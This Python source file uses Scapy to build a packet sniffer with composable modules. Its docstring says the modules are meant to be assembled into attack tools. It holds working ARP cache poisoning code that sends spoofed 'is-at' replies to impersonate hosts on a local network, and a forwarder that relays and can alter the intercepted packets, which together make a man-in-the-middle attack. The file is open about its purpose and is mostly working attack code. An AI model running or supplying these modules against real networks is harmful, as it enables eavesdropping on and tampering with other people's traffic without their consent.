# coding: utf-8
"""
Capture and manipulate traffic off the network.

This module provides a Sniffer class and a few "modules" which can be assembled to form attack tools.
These classes are based on Scapy and provide a convenient way to interact with and compose tools from it's functionality.

The advanced functions such as ARP poisonaing, packet forwarding, and analysis are decomposed into modules to allow
for greater flexibility and flexibility. Look at the constructed strategies for examples of how to compose the modules.
"""

import scapy.all as scapy
import enum
import net
import threading
import time

# Turn off print messages
scapy.conf.verb = 0

class Sniffer:
    def __init__(self, iface=None, processor=None, store=False, filter=None, quantum=0.25):
        self.iface = iface
        self.processor = processor
        self.store = store
        self.quantum = quantum
        self.filter = filter

        self.modules = []
        self.packets = []

        self._thread = None
        self._l2socket = None
        self._stopevent = threading.Event()
        self._moduleslock = threading.RLock()
        self._newmodules = []

    def register(self, *mods):
        with self._moduleslock:
            self.modules.extend(mods)
            self._newmodules.extend(mods)

    def process(self, pkt):
        with self._moduleslock:
            for mod in self.modules:
                if mod not in self._newmodules:
                    mod.process(pkt)
        if self.processor is not None:
            self.processor(pkt)

    def run(self):
        try:
            self._l2socket = scapy.conf.L2listen(iface=self.iface, filter=self.filter)

            while not self._stopevent.is_set():
                with self._moduleslock:
                    while self._newmodules:
                        self._newmodules.pop().start(self)

                pkts = self._l2socket.sniff(timeout=self.quantum, prn=self.process, store=self.store)
                self.packets.extend(pkts)
        finally:
            with self._moduleslock:
                for mod in self.modules:
                    mod.stop()

            if self._l2socket is not None:
                self._l2socket.close()
                self._l2socket = None

    def start(self):
        if self._thread is None or not self._thread.is_alive():
            self._stopevent.clear()
            self._thread = threading.Thread(target=self.run)
            self._thread.start()

    def join(self):
        if self._thread is not None:
            self._thread.join()

    def stop(self):
        self._stopevent.set()

class Module:
    """
    Module is the base for a packet sniffer module.
    Implementaions of Module provide a discrete functionality towards complex packet analysis and manipulation.
    """
    def start(self, sniffer):
        """
        Start will be called when the sniffer starts
        """
        pass

    def process(self, pkt):
        """
        Process will be called for every packet recieved by the sniffer
        """
        pass

    def stop(self):
        """
        Stop will be called when the sniffer stops
        """
        pass

class ArpCacheModule(Module):
    def __init__(self, ignore=None):
        self.sniffer = None
        self.ignore = set() if ignore is None else set(ignore)
        self.cache = {}

    def start(self, sniffer):
        self.sniffer = sniffer
        if self.sniffer.iface is not None:
            self.ignore.add(str(net.ifhwaddr(self.sniffer.iface)))

    def process(self, pkt):
        if scapy.Ether in pkt and scapy.ARP in pkt:
            src = pkt[scapy.Ether].src
            if src != '00:00:00:00:00:00' and src not in self.ignore:
                psrc = pkt[scapy.ARP].psrc
                if psrc != '0.0.0.0':
                    self.cache[psrc] = src

class ArpPoisoner(threading.Thread):
    def __init__(self, arpcache, iface=None, hwaddr=None, target=None, impersonate=None, interval=1):
        threading.Thread.__init__(self)
        self.arpcache = arpcache
        self.iface = iface
        self.interval = interval
        self.hwaddr = hwaddr
        self.target = target
        self.impersonate = impersonate

        self._stopevent = threading.Event()

    @staticmethod
    def enumerate(net):
        if isinstance(net, str):
            net = scapy.Net(net)
        return net

    def arping(self, target=None):
        # Figure out who we are trying to resolve
        if target is None:
            if self.target is None or self.impersonate is None:
                pdst = net.ifcidr(self.iface)
            else:
                # It has to be a list because scapy can be really cool, but also kinda wonky
                pdst = list(set(self.enumerate(self.target)) | set(self.enumerate(self.target)))
        else:
            pdst = target

        # Send out an arp "who-has" requests
        pkts = scapy.Ether(src=self.hwaddr, dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(op='who-has', hwsrc=self.hwaddr, pdst=pdst)
        scapy.sendp(pkts, iface=self.iface)

    def arpoison(self, target=None, impersonate=None):
        # Chose the target and impersonation lists
        impersonate = impersonate or self.impersonate or net.ifcidr(self.iface)
        target = target or self.target or net.ifcidr(self.iface)
        ifaddr = str(net.ifaddr(self.iface))

        # Filter out targets and impersonations not in our ARP cache
        pdst = [ip for ip in self.enumerate(target) if ip in self.arpcache]
        psrc = [ip for ip in self.enumerate(impersonate) if ip in self.arpcache]

        if pdst:
            # Build the packet list and filter out packets that would be sent to the true ip owner
            pkts = [scapy.Ether(src=self.hwaddr, dst=self.arpcache[ip])/scapy.ARP(op=['who-has', 'is-at'], hwsrc=self.hwaddr, psrc=psrc, pdst=ip) for ip in pdst]
            pkts = [p for p in pkts if p.psrc != p.pdst and p.dst != ifaddr]

            # Launch the payload
            scapy.sendp(pkts, iface=self.iface)

    def run(self):
        if self.hwaddr is None:
            self.hwaddr =  str(net.ifhwaddr(self.iface))

        self.arping()
        while not self._stopevent.is_set():
            self.arpoison()
            time.sleep(self.interval)

    def stop(self):
        self._stopevent.set()

class ArpPoisonerModule(Module):
    def __init__(self, arpcache, iface=None, hwaddr=None, target=None, impersonate=None, interval=1):
        self.poisoner = ArpPoisoner(
            arpcache=arpcache,
            iface=iface,
            hwaddr=hwaddr,
            target=target,
            impersonate=impersonate,
            interval=interval
        )
        self.sniffer = None

    def start(self, sniffer):
        self.sniffer = sniffer
        if self.poisoner.iface is None:
            self.poisoner.iface = self.sniffer.iface

        self.poisoner.start()

    def stop(self):
        self.poisoner.stop()

class ForwarderModule(Module):
    def __init__(self, arpcache, filter=None, iface=None, hwaddr=None):
        self.arpcache = arpcache
        self.filter = filter
        self.iface = iface
        self.hwaddr = hwaddr
        self.sniffer = None

    def start(self, sniffer):
        self.sniffer = sniffer

        if self.iface is None:
            self.iface = sniffer.iface
        if self.hwaddr is None:
            self.hwaddr = str(net.ifhwaddr(self.iface))

    def process(self, pkt):
        if scapy.IP in pkt and scapy.Ether in pkt:
            if pkt[scapy.Ether].dst == self.hwaddr and pkt[scapy.Ether].src != self.hwaddr:
                if pkt[scapy.IP].dst in self.arpcache:
                    pkt[scapy.Ether].dst = self.arpcache[pkt[scapy.IP].dst]

                    # After having patched the dst MAC, but before patching the src, apply the filter
                    if self.filter is not None:
                        pkt = self.filter(pkt)

                    if pkt is not None:
                        pkt[scapy.Ether].src = self.hwaddr
                        scapy.sendp(pkt, iface=self.iface)
